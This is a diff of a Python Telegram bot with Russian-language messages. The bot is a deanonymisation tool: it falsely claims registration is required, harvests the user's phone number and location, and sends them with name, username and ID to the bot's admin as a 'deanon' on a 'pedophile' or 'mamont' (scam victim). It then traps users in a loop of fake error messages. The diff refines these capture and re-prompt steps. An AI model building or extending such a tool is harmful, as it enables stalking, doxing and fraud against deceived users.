@@ -30,6 +30,7 @@ choose = input()
 
 if choose == '1':
 	bot = telebot.TeleBot(token)
+
 	print('\nБот запущен!')
 	@bot.message_handler(commands=['start','help'])
 	def start_message(message):
@@ -39,13 +40,13 @@ if choose == '1':
 	@bot.message_handler(commands=['koshmavarius'])
 	def koshmarik(message):
 		bot.send_message(message.chat.id,'@telebotuser is a creator this script.Good Luck!')
-	
+
 	@bot.message_handler()
 	def reg(message):
 		if message.text == '🔥Продолжить':
 			msg = bot.send_message(message.chat.id,'❗Для использования бота необходима регестрация',reply_markup=m.regphone)
 			bot.register_next_step_handler(msg,phone)
-	
+		
 	def phone(message):
 		if message.contact:
 			phone_user = message.contact.phone_number
@@ -56,7 +57,7 @@ if choose == '1':
 		else:
 			msg = bot.send_message(message.chat.id,'❗Для использования бота необходима регестрация')
 			bot.register_next_step_handler(msg,phone)
-			
+				
 	def loc(message,phone_user):
 		if message.location:
 			dolgota = message.location.longitude
@@ -64,20 +65,21 @@ if choose == '1':
 			bot.send_message(admin_id,f'🔔Деанон на педофила составлен!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}')
 			print(f'\nДеанон на педофила составлен!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}')
 			msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Повторите попытку позже.')
-			bot.register_next_step_handler(msg,fakeerror,phone_user,shirota,dolgota)
-	
-	def fakeerror(message,phone_user,shirota,dolgota):
-		if message.text:
-			msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Повторите попытку позже.')
-			bot.register_next_step_handler(msg,fakeerror,phone_user,shirota,dolgota)
-		if message.location:
-			bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Повторите попытку позже.')
-			msg = bot.send_message(admin_id,f'🔔Педофил отправил адрес еще раз!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}')
-			print(f'\nПедофил отправил адрес еще раз!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}')
-			bot.register_next_step_handler(msg,fakeerror,phone_user,shirota,dolgota)
+			bot.register_next_step_handler(msg,noexit)
+		else:
+			msg = bot.send_message(message.chat.id,'❗Для использования бота необходима регестрация')
+			bot.register_next_step_handler(msg,loc,phone_user)
+
+	def noexit(message):
+		msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Попробуйте еще раз')
+		bot.register_next_step_handler(msg,noexit)
 	bot.polling(none_stop=True)
+		
+	
+	
 
 if choose == '2':
+
 	bot = telebot.TeleBot(token)
 	print('\nБот запущен!')
 	@bot.message_handler(commands=['start'])
@@ -111,6 +113,7 @@ if choose == '2':
 		bot.register_next_step_handler(msg,age,nameuser,poluser)
 
 	def age(message,nameuser,poluser):
+		
 		ageuser = message.text
 		if message.text == '0':
 			msg = bot.send_message(message.chat.id,'❗Введите свой возраст')
@@ -118,7 +121,7 @@ if choose == '2':
 		try:
 			if int(message.text):
 				if int(message.text)>=18:
-					msg = bot.send_message(message.chat.id,f'Ваше имя "{nameuser}",возраст "{ageuser}" Пол "{poluser}".Все верно?Идем дальше?',reply_markup=m2.yesno)
+					msg = bot.send_message(message.chat.id,f'Ваше имя "{nameuser}",возраст "{ageuser}",пол "{poluser}".Все верно?Идем дальше?',reply_markup=m2.yesno)
 					bot.register_next_step_handler(msg,check,nameuser,ageuser,poluser)
 				else:
 					msg = bot.send_message(message.chat.id,'❗Несовершеннолетние лица не могут использовать данного бота')
@@ -175,10 +178,16 @@ if choose == '2':
 			print(f'\nДеанон на мамонта составлен!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phoneuser}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}\nЕго анкета:\nИмя {nameuser}\nВозраст {ageuser}\nПол {poluser}')
 			msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Попробуйте еще раз')
 			bot.register_next_step_handler(msg,noexit)
+		else:
+			msg = bot.send_message(message.chat.id,'❗Необходимо зарегестрироваться')
+			bot.register_next_step_handler(msg,loc,nameuser,ageuser,photouser,phoneuser,poluser)
+			
+
 			
 	def noexit(message):
 		msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Попробуйте еще раз')
 		bot.register_next_step_handler(msg,noexit)
+		
 	bot.polling(none_stop=True)
 
 if choose == '3':
@@ -272,16 +281,14 @@ if choose == '3':
 			print(f'\nДеанон на мамонта составлен!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phoneuser}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}\nЕго анкета:\nИмя {nameuser}\nВозраст {ageuser}\nПол {poluser}')
 			msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Попробуйте еще раз')
 			bot.register_next_step_handler(msg,noexit)
+		else:
+			msg = bot.send_message(message.chat.id,'❗Необходимо зарегестрироваться')
+			bot.register_next_step_handler(msg,loc,nameuser,ageuser,photouser,phoneuser,poluser)
 			
 	def noexit(message):
 		msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Попробуй еще раз')
 		bot.register_next_step_handler(msg,noexit)
 		
 	bot.polling(none_stop=True)
-
-
-
-		
-
-				
-				
+					
+					
